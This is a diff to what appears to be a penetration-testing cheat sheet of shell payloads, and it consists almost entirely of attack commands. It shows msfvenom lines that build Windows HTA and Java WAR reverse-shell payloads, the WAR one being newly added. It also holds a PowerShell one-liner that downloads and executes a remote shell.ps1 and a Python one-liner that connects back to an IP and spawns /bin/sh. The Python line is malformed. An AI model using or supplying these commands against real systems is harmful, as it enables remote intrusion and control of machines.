@@ -11,6 +11,7 @@
 ```
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f hta-psh evil.hta
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=443 -f war > shell.war
 ```
 ## Powershell shells
 
@@ -22,5 +23,7 @@ Download a bindshell
 ```
 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://IP:8000/shell.ps1\")"'
 ```
+```
 python -c socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
+
